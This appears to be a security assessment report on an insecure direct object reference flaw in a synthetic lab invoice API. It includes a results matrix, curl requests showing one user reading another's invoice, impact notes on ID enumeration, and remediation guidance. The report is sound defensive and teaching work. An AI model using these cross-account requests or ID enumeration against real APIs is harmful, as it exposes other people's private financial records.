# Finding: Broken Object Level Authorization (IDOR) on GET /invoices/{id}

**Target:** `http://lab:8080` (authorized synthetic lab API — read-only assessment, no changes made)
**Date:** 2026-09-08
**Severity:** High
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key

## Summary

`GET /invoices/{id}` enforces **authentication** but not **object-level authorization**. Any
authenticated user can retrieve any invoice by supplying its ID, regardless of ownership.
Both cross-account requests returned `200 OK` with the full object body.

## Test Accounts & Object Ownership

| Token | User |
|---|---|
| `Bearer lab-alice` | alice |
| `Bearer lab-bob` | bob |

| Object | Owner |
|---|---|
| `/invoices/101` | alice |
| `/invoices/202` | bob |

## Matrix of Results

| # | Request | Expected | Actual |
|---|---|---|---|
| 1 | unauth → `/invoices/101` | 401 | **401** ✔ |
| 2 | unauth → `/invoices/202` | 401 | **401** ✔ |
| 3 | alice → `/invoices/101` (own) | 200 | **200** ✔ |
| 4 | bob → `/invoices/202` (own) | 200 | **200** ✔ |
| 5 | alice → `/invoices/202` (cross) | 403/404 | **200** ✘ IDOR |
| 6 | bob → `/invoices/101` (cross) | 403/404 | **200** ✘ IDOR |
| 7 | invalid token → `/invoices/101` | 401 | **401** ✔ (control) |
| 8 | alice → `/invoices/999` (missing) | 404 | **404** ✔ (control) |
| 9 | bob → `/invoices/999` (missing) | 404 | **404** ✔ (control) |

Authentication (rows 1–2, 7) works; the failure is purely in per-object ownership checks (rows 5–6).

## Reproducible Evidence

### 1. Unauthenticated — rejected (baseline, correct)

```bash
curl -s -i http://lab:8080/invoices/101
```
```
HTTP/1.1 401 Unauthorized
content-type: application/json
Date: Tue, 08 Sep 2026 07:15:07 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Transfer-Encoding: chunked

{"error":"authentication required"}
```
(identical 401 for `/invoices/202`)

### 2. Own-object access — allowed (baseline, correct)

```bash
curl -s -i -H "Authorization: Bearer lab-alice" http://lab:8080/invoices/101
```
```
HTTP/1.1 200 OK
content-type: application/json
Date: Tue, 08 Sep 2026 07:15:16 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 38

{"id":101,"owner":"alice","amount":35}
```
```bash
curl -s -i -H "Authorization: Bearer lab-bob" http://lab:8080/invoices/202
```
```
HTTP/1.1 200 OK
content-type: application/json
Date: Tue, 08 Sep 2026 07:15:16 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 36

{"id":202,"owner":"bob","amount":99}
```

### 3. Cross-account access — VULNERABILITY (expected 403/404, got 200)

```bash
# alice reads bob's invoice
curl -s -i -H "Authorization: Bearer lab-alice" http://lab:8080/invoices/202
```
```
HTTP/1.1 200 OK
content-type: application/json
Date: Tue, 08 Sep 2026 07:15:16 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 36

{"id":202,"owner":"bob","amount":99}
```
```bash
# bob reads alice's invoice
curl -s -i -H "Authorization: Bearer lab-bob" http://lab:8080/invoices/101
```
```
HTTP/1.1 200 OK
content-type: application/json
Date: Tue, 08 Sep 2026 07:15:16 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 38

{"id":101,"owner":"alice","amount":35}
```

The full object (including the `owner` and `amount` fields) is disclosed to a user who does not
own it.

### 4. Controls

```bash
curl -s -i -H "Authorization: Bearer lab-mallory" http://lab:8080/invoices/101
```
```
HTTP/1.1 401 Unauthorized
content-type: application/json
Date: Tue, 08 Sep 2026 07:15:34 GMT

{"error":"authentication required"}
```
```bash
curl -s -i -H "Authorization: Bearer lab-alice" http://lab:8080/invoices/999
# and the same with lab-bob
```
```
HTTP/1.1 404 Not Found
content-type: application/json
Date: Tue, 08 Sep 2026 07:15:34 GMT

{"error":"not found"}
```

## Impact

- **Confidentiality:** Any authenticated user can read invoices of all other users by
  supplying arbitrary IDs. In this dataset, financial data (`amount`) and owner identity are
  exposed.
- **Enumeration amplifier:** IDs are small, sequential, and predictable (101, 202), so full
  dataset traversal via brute force is trivial (e.g., loop `id = 1..N`).
- **Likely write-side exposure (adjacent risk):** Where an object is fetched by ID without an
  ownership check, the same handler pattern often underpins `PUT`/`PATCH`/`DELETE`. If those
  verbs share this lookup, cross-account modification or deletion is possible. (Not verified
  here — assessment was scoped to GET; recommend follow-up.)
- **Business impact:** unauthorized access to billing/financial records; regulatory exposure
  (e.g., GDPR/PCI-DSS) where invoice data is personal or payment-related.

## Root Cause

The endpoint authenticates the caller (401 without/with a bad token) and looks up the object
by the client-supplied ID, but never verifies that the resolved object's `owner` matches the
authenticated principal before returning it. Authorization is effectively reduced to
"logged in."

## Remediation

1. **Enforce object-level authorization in the handler** (primary fix):
   - Load the object by `id`, then verify `object.owner == principal` (or a role/group/ACL
     check, e.g. admin or accounting role) **before** building the response.
   - Deny with `404 Not Found` for non-owned objects (avoids confirming the ID's existence to
     outsiders; `403` is also acceptable if the ID space is not enumerable — pick one policy
     consistently).
   - Example (pseudocode):
     ```python
     inv = invoices.get(id)
     if inv is None or (inv.owner != current_user and current_user.role != "admin"):
         return 404, {"error": "not found"}
     return 200, inv
   ```
2. **Centralize the check** — implement it in middleware/a repository layer
   (`Invoice.for_user(current_user)`) so no endpoint can forget it; avoid per-route ad-hoc checks.
3. **Prefer non-enumerable identifiers** (ULIDs/UUIDs) for externally exposed resources to
   limit brute-force enumeration as defense in depth.
4. **Automate regression tests** asserting the full matrix: unauth→401, own→200,
   cross-account→403/404, invalid token→401, missing→404. Add a CI job (or OWASP ZAP /
   policy-as-code check) so regressions fail the build.
5. **Audit the other verbs and endpoints** (PUT/PATCH/DELETE, list endpoints, any other
   ID-keyed resources) for the same missing ownership check.

## Verification After Fix (expected)

```bash
curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer lab-alice" http://lab:8080/invoices/202
# expect: 403 or 404 (currently: 200)
curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer lab-bob"   http://lab:8080/invoices/101
# expect: 403 or 404 (currently: 200)
```
